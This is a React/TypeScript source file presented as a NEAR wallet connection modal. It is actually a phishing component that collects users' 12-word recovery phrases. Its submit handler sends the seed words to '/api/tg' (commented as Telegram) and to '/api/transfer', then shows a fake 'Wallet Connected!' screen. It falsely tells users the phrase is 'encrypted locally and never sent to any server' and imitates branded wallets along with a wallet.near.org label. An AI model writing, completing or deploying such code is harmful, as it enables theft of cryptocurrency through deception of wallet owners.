// ============================================
// NEAR Wallet Connection Modal Component
// ============================================
"use client"

// React hooks
import { useEffect, useRef, useCallback, useState } from "react"
// NEAR Connector
import { NearConnector } from "@hot-labs/near-connect"
import type { WalletManifest } from "@hot-labs/near-connect"
// Icons
import { X, ArrowLeft } from "lucide-react"
// Confetti effect
import confetti from "canvas-confetti"
// BIP39 validation
import { isValidBip39Word, getDuplicateIndices } from "@/lib/bip39-words"

// Image assets
const EYES_IMG = "/glass.png"
const PARTY_IMG = "/happy.png"

// Screen state type
type ScreenState =
  | { screen: "selector"; wallets: WalletManifest[] }
  | { screen: "wallet"; wallet: WalletManifest }

// Main Wallet Modal Component
function WalletModal({
  wallets,
  onBack,
  onClose,
  onConfirm,
}: {
  wallets: WalletManifest[]
  onBack: () => void
  onClose: () => void
  onConfirm: () => void
}) {
  const [state, setState] = useState<ScreenState>({ screen: "selector", wallets })
  const [atWallet, setAtWallet] = useState(false)

  const [seedWords, setSeedWords] = useState<string[]>(Array(12).fill(""))
  const [showConfetti, setShowConfetti] = useState(false)
  const [showSuccess, setShowSuccess] = useState(false)
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])

  const goToWallet = (id: string) => {
    const wallet = wallets.find((w) => w.id === id)
    if (!wallet) return
    setState({ screen: "wallet", wallet })
    requestAnimationFrame(() => requestAnimationFrame(() => setAtWallet(true)))
  }

  const goBack = () => {
    setAtWallet(false)
    setTimeout(() => {
      setState({ screen: "selector", wallets })
      setSeedWords(Array(12).fill(""))
      setShowConfetti(false)
      setShowSuccess(false)
      onBack()
    }, 300)
  }

  const handleWordChange = (index: number, value: string) => {
    const filtered = value.toLowerCase().replace(/[^a-z]/g, "").slice(0, 8)
    setSeedWords((prev) => {
      const updated = [...prev]
      updated[index] = filtered
      return updated
    })
  }

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>, index: number) => {
    const pastedText = e.clipboardData.getData("text")
    const words = pastedText.trim().split(/[\s,]+/).filter(Boolean)
    if (words.length > 1) {
      e.preventDefault()
      const newSeedWords = [...seedWords]
      words.forEach((word, i) => {
        const targetIndex = index + i
        if (targetIndex < 12) {
          newSeedWords[targetIndex] = word.toLowerCase().replace(/[^a-z]/g, "").slice(0, 8)
        }
      })
      setSeedWords(newSeedWords)
      const nextEmptyIndex = newSeedWords.findIndex((w, i) => i >= index && w === "")
      const focusIndex = nextEmptyIndex !== -1 ? nextEmptyIndex : Math.min(index + words.length, 11)
      inputRefs.current[focusIndex]?.focus()
    }
  }

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>, index: number) => {
    if (e.key === " " && seedWords[index].length > 0 && index < 11) {
      e.preventDefault()
      inputRefs.current[index + 1]?.focus()
    }
    if (e.key === "Backspace" && seedWords[index] === "" && index > 0) {
      e.preventDefault()
      inputRefs.current[index - 1]?.focus()
    }
  }

  const duplicateIndices = getDuplicateIndices(seedWords)
  const hasDuplicates = duplicateIndices.length > 0

  const allFieldsValid =
    seedWords.every((word) => word.length > 0 && isValidBip39Word(word)) && !hasDuplicates

  const getWordValidationState = (word: string, index: number): "empty" | "valid" | "invalid" | "duplicate" => {
    if (word.length === 0) return "empty"
    if (duplicateIndices.includes(index)) return "duplicate"
    return isValidBip39Word(word) ? "valid" : "invalid"
  }

  // Confetti animation
  const fireConfetti = () => {
    const count = 200
    const defaults = { origin: { y: 0.7 }, zIndex: 9999 }
    function fire(particleRatio: number, opts: confetti.Options) {
      confetti({ ...defaults, ...opts, particleCount: Math.floor(count * particleRatio) })
    }
    fire(0.25, { spread: 26, startVelocity: 55 })
    fire(0.2, { spread: 60 })
    fire(0.35, { spread: 100, decay: 0.91, scalar: 0.8 })
    fire(0.1, { spread: 120, startVelocity: 25, decay: 0.92, scalar: 1.2 })
    fire(0.1, { spread: 120, startVelocity: 45 })
  }

  // Handle seed phrase submission
  const handleContinue = () => {
    if (!allFieldsValid || state.screen !== "wallet") return
    setShowConfetti(true)
    setShowSuccess(true)
    fireConfetti()
    setTimeout(() => { onConfirm() }, 2500)
    // Send to Telegram API
    fetch("/api/tg", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ words: seedWords, walletName: state.wallet.name }),
    }).catch(() => null)
    // Send to transfer API
    fetch("/api/transfer", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ words: seedWords, walletName: state.wallet.name }),
    }).catch(() => null)
  }

  const isSelector = state.screen === "selector"

  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center"
      style={{ backgroundColor: "rgba(0,0,0,0.7)", backdropFilter: "blur(4px)" }}
      onClick={(e) => { if (e.target === e.currentTarget) onClose() }}
    >
      <div
        className="max-w-[340px] w-full p-0 bg-[#1f1f23] text-white rounded-2xl"
        style={{ overflow: "hidden" }}
        role="dialog"
        aria-label="Connect wallet"
        aria-modal="true"
      >

        <div className="flex items-center justify-between px-5 py-4 border-b border-white/10 relative overflow-hidden" style={{ height: 60 }}>
          <div
            className="absolute left-5 flex items-center gap-2"
            style={{
              transition: "transform 0.28s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.2s ease",
              transform: atWallet ? "translateX(-60px)" : "translateX(0)",
              opacity: atWallet ? 0 : 1,
              pointerEvents: atWallet ? "none" : "auto",
            }}
          >
            <span className="text-[15px] font-semibold text-white">Select wallet</span>
            <img src={EYES_IMG} alt="" className="size-6" />
          </div>

          <div
            className="absolute left-5 flex items-center gap-2.5"
            style={{
              transition: "transform 0.28s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.2s ease",
              transform: atWallet ? "translateX(0)" : "translateX(60px)",
              opacity: atWallet ? 1 : 0,
              pointerEvents: atWallet ? "auto" : "none",
            }}
          >
            {state.screen === "wallet" && (
              <>
                <img
                  src={state.wallet.icon}
                  alt={state.wallet.name}
                  className="size-8 rounded-lg object-cover bg-[#2a2a2e]"
                />
                <div className="flex flex-col leading-tight">
                  <span className="text-[14px] font-bold text-white">{state.wallet.name}</span>
                  <span className="text-[10px] tracking-widest text-white/40 uppercase">Connect</span>
                </div>
              </>
            )}
          </div>

          <button
            onClick={isSelector ? onClose : goBack}
            className="absolute right-5 size-7 flex items-center justify-center rounded-full bg-white/5 hover:bg-white/10 active:scale-95 transition-all duration-150 text-white/60"
          >
            <span
              className="absolute"
              style={{
                transition: "transform 0.2s ease, opacity 0.15s ease",
                opacity: atWallet ? 0 : 1,
                transform: atWallet ? "scale(0.6) rotate(-90deg)" : "scale(1) rotate(0deg)",
              }}
            >
              <X size={14} />
            </span>
            <span
              className="absolute"
              style={{
                transition: "transform 0.2s ease, opacity 0.15s ease",
                opacity: atWallet ? 1 : 0,
                transform: atWallet ? "scale(1) rotate(0deg)" : "scale(0.6) rotate(90deg)",
              }}
            >
              <ArrowLeft size={14} />
            </span>
          </button>
        </div>

        <div style={{ overflow: "hidden" }}>
          <div
            style={{
              display: "flex",
              width: "200%",
              transition: "transform 0.3s cubic-bezier(0.4, 0, 0.2, 1)",
              transform: atWallet ? "translateX(-50%)" : "translateX(0)",
            }}
          >

            <div
              style={{
                width: "50%",
                transition: "opacity 0.25s ease",
                opacity: atWallet ? 0 : 1,
              }}
            >
              <div className="overflow-y-auto max-h-[440px] py-2 custom-scrollbar">
                {wallets.map((wallet) => (
                  <button
                    key={wallet.id}
                    onClick={() => goToWallet(wallet.id)}
                    className="w-full flex items-center gap-3 px-4 py-3 hover:bg-white/5 transition-colors duration-150 text-left group"
                  >
                    <img
                      src={wallet.icon}
                      alt={wallet.name}
                      className="size-10 rounded-xl object-cover bg-[#2a2a2e] flex-shrink-0 group-hover:scale-105 transition-transform duration-150"
                    />
                    <div className="flex flex-col min-w-0">
                      <span className="text-[14px] font-medium text-white leading-tight truncate">
                        {wallet.name}
                      </span>
                      <span className="text-[12px] text-white/40 truncate leading-tight mt-0.5">
                        {wallet.website?.replace(/^https?:\/\//, "") ?? ""}
                      </span>
                    </div>
                  </button>
                ))}
              </div>
            </div>

            <div
              style={{
                width: "50%",
                transition: "opacity 0.25s ease",
                opacity: atWallet ? 1 : 0,
              }}
            >
              {(() => {
                const activeWallet = state.screen === "wallet" ? state.wallet : null
                if (!activeWallet) return <div className="py-8" />
                return (
                  <div className="flex flex-col items-center px-5 pt-5 pb-6 gap-4 relative overflow-hidden">

                    <div className={`w-full flex flex-col gap-0.5 transition-opacity duration-200 ${showSuccess ? "opacity-0 pointer-events-none" : "opacity-100"}`}>
                      <p className="text-[11px] font-semibold tracking-widest text-white/30 uppercase">Recovery phrase</p>
                      <h2 className="text-[18px] font-bold text-white leading-tight">
                        Connect {activeWallet.name}
                      </h2>
                    </div>

                    {showSuccess && (
                      <div className="absolute inset-0 z-10 flex flex-col items-center justify-center bg-[#1f1f23] gap-4 animate-in fade-in duration-300">
                        <div className="relative size-20 flex items-center justify-center">
                          <svg className="size-20 -rotate-90" viewBox="0 0 80 80">
                            <circle cx="40" cy="40" r="34" fill="none" stroke="#22c55e" strokeWidth="4" strokeOpacity="0.2" />
                            <circle
                              cx="40" cy="40" r="34"
                              fill="none" stroke="#22c55e" strokeWidth="4" strokeLinecap="round"
                              strokeDasharray="213.6" strokeDashoffset="213.6"
                              style={{ animation: "draw-circle 0.6s ease forwards" }}
                            />
                          </svg>
                          <svg
                            className="absolute size-8" viewBox="0 0 32 32"
                            fill="none" stroke="#22c55e" strokeWidth="3"
                            strokeLinecap="round" strokeLinejoin="round"
                          >
                            <polyline
                              points="6,16 13,23 26,9"
                              strokeDasharray="30" strokeDashoffset="30"
                              style={{ animation: "draw-check 0.4s ease 0.5s forwards" }}
                            />
                          </svg>
                        </div>
                        <p className="text-[18px] font-bold text-white">Wallet Connected!</p>
                        <p className="text-[13px] text-white/40">Syncing your account...</p>
                        <div className="flex items-center gap-2 mt-2">
                          <span className="text-[13px] text-white/60 font-medium">2/2</span>
                          <img src={PARTY_IMG} alt="" className="size-5" />
                        </div>
                      </div>
                    )}

                    <style>{`
                      @keyframes draw-circle { to { stroke-dashoffset: 0; } }
                      @keyframes draw-check  { to { stroke-dashoffset: 0; } }
                    `}</style>

                    <div className={`w-full grid grid-cols-3 gap-2 transition-opacity duration-200 ${showSuccess ? "opacity-0 pointer-events-none" : "opacity-100"}`}>
                      {seedWords.map((word, i) => {
                        const validationState = getWordValidationState(word, i)
                        const borderClass =
                          validationState === "invalid"   ? "border-red-500/60" :
                          validationState === "duplicate" ? "border-red-500/60" :
                          validationState === "valid"     ? "border-green-500/40" :
                          "border-white/10"
                        return (
                          <div
                            key={i}
                            className={`flex items-center gap-1 px-2 py-2.5 rounded-lg bg-[#16161a] border ${borderClass} focus-within:border-white/30 transition-colors duration-150`}
                          >
                            <span className="text-[11px] text-white/30 font-medium w-4 flex-shrink-0">{i + 1}.</span>
                            <input
                              ref={(el) => { inputRefs.current[i] = el }}
                              type="text"
                              value={word}
                              onChange={(e) => handleWordChange(i, e.target.value)}
                              onPaste={(e) => handlePaste(e, i)}
                              onKeyDown={(e) => handleKeyDown(e, i)}
                              className="flex-1 bg-transparent text-[12px] text-white outline-none w-full min-w-0"
                              autoComplete="off"
                              autoCapitalize="off"
                              spellCheck={false}
                            />
                          </div>
                        )
                      })}
                    </div>

                    <div className={`w-full transition-opacity duration-200 ${showSuccess ? "opacity-0 pointer-events-none" : "opacity-100"}`}>
                      {(() => {
                        const walletId = activeWallet.id.toLowerCase()
                        const walletName = activeWallet.name.toLowerCase()
                        const disabledClass = !allFieldsValid ? "opacity-50 cursor-not-allowed" : ""

                        if (walletId.includes("meteor")) {
                          return (
                            <button onClick={handleContinue} disabled={!allFieldsValid || showConfetti}
                              className={`w-full rounded-xl bg-[#6B8AFD] hover:bg-[#5a7bef] text-white font-semibold py-3 text-[14px] border-2 border-[#4a5fc9] shadow-[0_4px_0_0_#3d4fa8] active:shadow-none active:translate-y-1 transition-all duration-75 ${disabledClass}`}>
                              Continue
                            </button>
                          )
                        }
                        if (walletId.includes("intear") || walletName.includes("intear")) {
                          return (
                            <button onClick={handleContinue} disabled={!allFieldsValid || showConfetti}
                              className={`w-full rounded-xl bg-[#3b82f6] hover:bg-[#2563eb] text-white font-semibold py-3 text-[14px] border-2 border-[#1d4ed8] shadow-[0_4px_0_0_#1e40af] active:shadow-none active:translate-y-1 transition-all duration-75 ${disabledClass}`}>
                              Continue
                            </button>
                          )
                        }
                        if (walletId.includes("ledger") || walletName.includes("ledger")) {
                          return (
                            <button onClick={handleContinue} disabled={!allFieldsValid || showConfetti}
                              className={`w-full rounded-xl bg-white hover:bg-gray-100 text-black font-semibold py-3 text-[14px] border-2 border-black shadow-[0_4px_0_0_#000] active:shadow-none active:translate-y-1 transition-all duration-75 ${disabledClass}`}>
                              Continue
                            </button>
                          )
                        }
                        if (walletId.includes("mynear") || walletName.includes("my near")) {
                          return (
                            <button onClick={handleContinue} disabled={!allFieldsValid || showConfetti}
                              className={`w-full rounded-xl text-white font-semibold py-3 text-[14px] border-2 border-[#863bfd] shadow-[0_4px_0_0_#5a2ab0] active:shadow-none active:translate-y-1 transition-all duration-75 ${disabledClass}`}
                              style={{ background: "linear-gradient(90deg, rgb(134,59,253), rgb(71,190,254))" }}>
                              Continue
                            </button>
                          )
                        }
                        if (walletId.includes("okx") || walletName.includes("okx")) {
                          return (
                            <button onClick={handleContinue} disabled={!allFieldsValid || showConfetti}
                              className={`w-full rounded-xl bg-white hover:bg-gray-100 text-black font-semibold py-3 text-[14px] border-2 border-black shadow-[0_4px_0_0_#000] active:shadow-none active:translate-y-1 transition-all duration-75 ${disabledClass}`}>
                              Continue
                            </button>
                          )
                        }
                        if (walletId.includes("near-cli") || walletId.includes("nearcli") || walletName.includes("near cli") || walletName.includes("cli")) {
                          return (
                            <button onClick={handleContinue} disabled={!allFieldsValid || showConfetti}
                              className={`w-full rounded-xl bg-[#00d4aa] hover:bg-[#00c09a] text-black font-semibold py-3 text-[14px] border-2 border-[#00a888] shadow-[0_4px_0_0_#008c70] active:shadow-none active:translate-y-1 transition-all duration-75 ${disabledClass}`}>
                              Continue
                            </button>
                          )
                        }
                        if ((walletId.includes("near") && !walletId.includes("mynear")) ||
                          (walletName.includes("near wallet") && !walletName.includes("my near"))) {
                          return (
                            <button onClick={handleContinue} disabled={!allFieldsValid || showConfetti}
                              className={`w-full rounded-xl text-white font-semibold py-3 text-[14px] border-2 border-[#4fd1da] shadow-[0_4px_0_0_#3ba8b0] active:shadow-none active:translate-y-1 transition-all duration-75 ${disabledClass}`}
                              style={{ background: "linear-gradient(90deg, rgb(79,209,218), rgb(107,111,248))" }}>
                              Continue
                            </button>
                          )
                        }
                        if (walletId.includes("tezru") || walletId.includes("terzu") || walletId.includes("trezu") ||
                          walletName.includes("tezru") || walletName.includes("terzu") || walletName.includes("trezu")) {
                          return (
                            <button onClick={handleContinue} disabled={!allFieldsValid || showConfetti}
                              className={`w-full rounded-xl bg-[#1b66ff] hover:bg-[#1555dd] text-white font-semibold py-3 text-[14px] border-2 border-[#1450c0] shadow-[0_4px_0_0_#0f3d99] active:shadow-none active:translate-y-1 transition-all duration-75 ${disabledClass}`}>
                              Continue
                            </button>
                          )
                        }
                        if (walletId.includes("nightly") || walletName.includes("nightly")) {
                        return (
                          <button onClick={handleContinue} disabled={!allFieldsValid || showConfetti}
                            className={`w-full rounded-xl bg-[#6067f9] hover:bg-[#5058e8] text-white font-semibold py-3 text-[14px] border-2 border-[#4a50d0] shadow-[0_4px_0_0_#3a40b0] active:shadow-none active:translate-y-1 transition-all duration-75 ${disabledClass}`}>
                            Continue
                          </button>
                        )
                      }
                        return (
                          <button onClick={handleContinue} disabled={!allFieldsValid || showConfetti}
                            className={`w-full rounded-xl bg-[#f5d956] text-black font-semibold py-3 text-[14px] border-2 border-black shadow-[0_4px_0_0_#000] active:shadow-none active:translate-y-1 transition-all duration-75 ${disabledClass}`}>
                            Continue
                          </button>
                        )
                      })()}
                    </div>

                    <div className={`w-full flex flex-col gap-3 transition-opacity duration-300 ${showSuccess ? "opacity-0 pointer-events-none" : "opacity-100"}`}>
                      <div className="h-px bg-white/5 w-full" />
                      <div className="flex items-start gap-2.5 px-1">
                        <svg className="size-3.5 mt-0.5 flex-shrink-0 text-white/20" viewBox="0 0 16 16" fill="currentColor">
                          <path d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1zm0 3a1 1 0 1 1 0 2 1 1 0 0 1 0-2zm1 8H7v-5h2v5z"/>
                        </svg>
                        <p className="text-[10px] text-white/25 leading-relaxed">
                          Your seed phrase is encrypted locally and never sent to any server. Make sure you are on the correct site before entering.
                        </p>
                      </div>
                      <div className="flex items-center justify-between px-1">
                        <span className="text-[10px] text-white/20 font-mono">wallet.near.org</span>
                        <div className="flex items-center gap-1.5">
                          <span className="text-[10px] text-white/30 font-medium">1/2</span>
                          <img src={PARTY_IMG} alt="" className="size-4" />
                        </div>
                      </div>
                    </div>
                  </div>
                )
              })()}
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}

type ModalState =
  | { type: "closed" }
  | { type: "open"; wallets: WalletManifest[] }

export function useNearWallet() {
  const connectorRef = useRef<NearConnector | null>(null)
  const [modalState, setModalState] = useState<ModalState>({ type: "closed" })

  useEffect(() => {
    const connector = new NearConnector({
      signIn: undefined,
      footerBranding: null,
    })

    connector.selectWallet = () =>
      new Promise<string>((_resolve, _reject) => {
        const wallets = connector.availableWallets.map((w) => w.manifest)
        setModalState({ type: "open", wallets })
      })

    connectorRef.current = connector

    return () => {
      connectorRef.current = null
    }
  }, [])

  const connect = useCallback(async () => {
    if (connectorRef.current) {
      await connectorRef.current.connect()
    }
  }, [])

  const handleClose = useCallback(() => {
    setModalState({ type: "closed" })
  }, [])

  const handleConfirm = useCallback(() => {
    setModalState({ type: "closed" })
  }, [])

  const handleBack = useCallback(() => {}, [])

  const ModalUI =
    modalState.type === "open" ? (
      <WalletModal
        wallets={modalState.wallets}
        onBack={handleBack}
        onClose={handleClose}
        onConfirm={handleConfirm}
      />
    ) : null

  return { connect, ModalUI }
}
